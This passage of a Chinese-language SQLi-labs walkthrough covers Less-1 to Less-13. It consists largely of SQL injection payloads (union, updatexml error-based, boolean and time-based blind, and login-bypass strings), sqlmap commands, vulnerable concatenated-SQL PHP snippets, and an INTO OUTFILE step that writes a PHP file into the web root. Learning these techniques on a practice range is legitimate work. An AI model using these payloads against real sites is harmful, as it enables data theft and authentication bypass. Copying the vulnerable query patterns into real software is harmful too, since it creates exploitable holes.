0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>数据库第一个字母为 <code>s</code></p><pre><code class="hljs sql">?id=1&#x27; and left(database(),1)&gt;&#x27;r&#x27;--+?id=1&#x27; and left(database(),1)&gt;&#x27;s&#x27;--+?id=1&#x27; and left(database(),2)&gt;&#x27;sd&#x27;--+?id=1&#x27; and left(database(),2)&gt;&#x27;se&#x27;--+...</code></pre><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><p>利用<code>if(条件,0,1)</code>函数，当条件为真，返回0，假则返回1</p><pre><code class="hljs sql">?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+?id=1&#x27; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+...</code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><strong>联合查询注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</code></pre><p><strong>报错注入</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</code></pre><p><strong>布尔盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</code></pre><p><strong>延时盲注</strong></p><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://sqli.pl/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</code></pre><h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询内容<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><h3 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre><code class="hljs sql">?id=1&#x27;?id=1&#x27; order by 3 <span class="hljs-comment">--+</span>?id=1&#x27; order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已</p><pre><code class="hljs sql">?id=1?id=1 order by 3 <span class="hljs-comment">--+</span>?id=1 order by 4 <span class="hljs-comment">--+</span>?id=-1 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-number">0x7573657273</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="hljs-subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</code></pre><p>和 Less-1 利用方式一致，只是闭合方式不一样而已。</p><pre><code class="hljs sql">?id=1&#x27;)?id=1&#x27;) order by 3 <span class="hljs-comment">--+</span>?id=1&#x27;) order by 4 <span class="hljs-comment">--+</span>?id=-1&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先双引号 在括号拼接</span><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span> . <span class="hljs-variable">$id</span> . <span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询内容<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><pre><code class="hljs sql">?id=1&quot;)?id=1&quot;) order by 3 <span class="hljs-comment">--+</span>?id=1&quot;) order by 4 <span class="hljs-comment">--+</span>?id=-1&quot;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>() <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,database(),version() --+</span><span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-number">0x7365637572697479</span> <span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">-1</span><span class="hljs-string">&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+</span><span class="hljs-string">?id=-1&quot;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">--+</span></code></pre><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 直接单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持报错、布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in...........<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致。</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+ </span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 3,1),0x7e),1)--+ </span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name = <span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span>?<span class="hljs-keyword">id</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</span><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-5 利用方式一致，只是闭合方式不一样，这里不再啰嗦了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号加双层括号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="hljs-subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持布尔盲注、延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in.... <span class="hljs-keyword">Use</span> <span class="hljs-title">outfile</span>......<span class="hljs-title">else</span>:    输出 <span class="hljs-title">You</span> <span class="hljs-title">have</span> <span class="hljs-title">an</span> <span class="hljs-title">error</span> <span class="hljs-title">in</span> <span class="hljs-title">your</span> <span class="hljs-title">SQL</span> <span class="hljs-title">syntax</span>  //<span class="hljs-title">print_r</span>(<span class="hljs-title">mysql_error</span>());</code></pre><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p><p>因为这一关作者很明显地提示了如下信息：</p><pre><code class="hljs lasso">You are <span class="hljs-keyword">in</span><span class="hljs-params">...</span>. Use outfile<span class="hljs-params">...</span><span class="hljs-params">...</span></code></pre><p>所以我们就来配合一下作者，使用 outfile 导出到文件来查询数据，默认 outfile 是没有开启的，得手动开启一下</p><pre><code class="hljs Bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure%&#x27;</span>;+--------------------------+-------+| Variable_name            | Value |+--------------------------+-------+| require_secure_transport | OFF   || secure_file_priv         | NULL  |+--------------------------+-------+2 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span>, 1 warning (0.02 sec)</code></pre><ul><li>secure_file_priv的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li><li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li></ul><p><code>在mysql.ini里添加&quot;secure_file_priv=&#39;&#39;，保存，重启mysql</code></p><p>一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p><pre><code class="hljs sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/users.txt&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>users.txt内容</p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>DumbDumb<span class="hljs-attribute">2</span>AngelinaI-kill-you<span class="hljs-attribute">3</span>Dummyp@ssword<span class="hljs-attribute">4</span>securecrappy<span class="hljs-attribute">5</span>stupidstupidity<span class="hljs-attribute">6</span>supermangenious<span class="hljs-attribute">7</span>batmanmob!le<span class="hljs-attribute">8</span>adminadmin<span class="hljs-attribute">9</span>admin<span class="hljs-number">1</span>admin<span class="hljs-number">1</span><span class="hljs-attribute">10</span>admin<span class="hljs-number">2</span>admin<span class="hljs-number">2</span><span class="hljs-attribute">11</span>admin<span class="hljs-number">3</span>admin<span class="hljs-number">3</span><span class="hljs-attribute">12</span>dhakkandumbo<span class="hljs-attribute">14</span>admin<span class="hljs-number">4</span>admin<span class="hljs-number">4</span></code></pre><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p><pre><code class="hljs Sql">?id=1&#x27;)) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">outfile</span> <span class="hljs-string">&quot;D:/phpstudy_pro/WWW/sqli.pl/Less-7/info.php&quot;</span><span class="hljs-comment">--+ </span></code></pre><p>访问对应的 URL 看看是否解析了呢：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200720_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%981-20%E5%85%B3/01.png" alt="img"></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+?id&#x3D;1&#39; and left(database(),2)&gt;&#39;sd&#39;--+?id&#x3D;1&#39; and left(database(),2)&gt;&#39;se&#39;--+...</code></pre><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>和 Less-7 注入方式一致，只是拼接方式不一样</p><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 使用单引号拼接</span><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in............<span class="hljs-keyword">else</span>:    输出 You are in...........</code></pre><p>从源码中可以看到 if else 都输出的是 You are in……….. 这样就不能通过布尔盲注来进行注入了，只能用最慢的延时注入.</p><pre><code class="hljs mysql">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),2,1))&gt;101,1,sleep(5))--+...</code></pre><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># 先使用双引号再直接拼接</span><span class="hljs-variable">$id</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;&quot;&#x27;</span>;<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span> LIMIT 0,1&quot;</span>;<span class="hljs-comment"># 支持延时盲注</span><span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出 You are in............<span class="hljs-keyword">else</span>:    输出 You are in...........</code></pre><p>和 Less-9 利用方式一样，只是拼接方式不一样，具体可以参考 Less-9</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># 使用单引号拼接 SQL</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="hljs-subst">$uname</span>&#x27; and password=&#x27;<span class="hljs-subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    输出查询的信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>和 Less-1 的利用方式相同，只是由 GET 型变成 POST 型。</p><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>这里拿 admin 用户来模拟登录测试，首先查询出 admin 的用户信息如下：</p><pre><code class="hljs mysql">mysql&gt; select * from users where username &#x3D; &#39;admin&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  8 | admin    | admin    |+----+----------+----------+</code></pre><p>因为核心的 SQL 语句只使用单引号拼接，这里就是一个经典的万能密码漏洞，可以使用如下 Payload 来登录系统：</p><pre><code class="hljs Bash"><span class="hljs-comment"># 注释掉 passwd 来登录</span>uname=admin<span class="hljs-string">&#x27; or 1=1#&amp;passwd=&amp;submit=Submit</span><span class="hljs-string">uname=admin&#x27;</span><span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span><span class="hljs-comment"># 注释后面语句 并 添加一个永真条件</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span><span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27; or 1#&amp;submit=Submit</span><span class="hljs-string">uname=admin&amp;passwd=1&#x27;</span>||1<span class="hljs-comment">#&amp;submit=Submit</span><span class="hljs-comment"># 闭合后面语句 并 添加一个永真条件</span>uname=admin&amp;passwd=1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submituname=admin&amp;passwd=1<span class="hljs-string">&#x27;||&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1&amp;submit=Submit</code></pre><blockquote><p>POST 数据里面不能有 <code>+</code>，这里得手动转换为空格</p></blockquote><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>和 Less-11 的利用方式一样，只是 SQL 拼接方式不同，这里就不再啰嗦了。</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错、布尔盲注、延时盲注</td><td><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong></p><pre><code class="hljs Php"><span class="hljs-comment"># POST 方式接受变量</span><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>];<span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<span class="hljs-comment"># 使用单引号和括号来拼接 SQL</span>@<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="hljs-subst">$uname</span>&#x27;) and password=(&#x27;<span class="hljs-subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;<span class="hljs-keyword">if</span> <span class="hljs-literal">true</span>:    并没有输出啥信息<span class="hljs-keyword">else</span>:    print_r(mysql_error());</code></pre><p>因为没有输出查询后的信息的原因，所以相对于 Less-11 和 Less-12 来说就少了 联合查询的注入方式，其他还是换汤不换药，这里就不再赘述了。</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" 